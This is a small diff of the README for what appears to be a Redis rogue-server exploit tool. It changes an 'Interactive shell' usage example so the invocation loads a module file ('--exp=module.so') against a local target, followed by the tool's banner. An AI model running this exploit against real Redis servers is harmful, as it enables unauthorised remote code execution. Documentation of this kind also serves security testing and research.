@@ -50,7 +50,7 @@ Options:
 ### Interactive shell
 
 ```
-➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
+➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1 --exp=module.so
 ______         _ _      ______                         _____                          
 | ___ \       | (_)     | ___ \                       /  ___|                         
 | |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
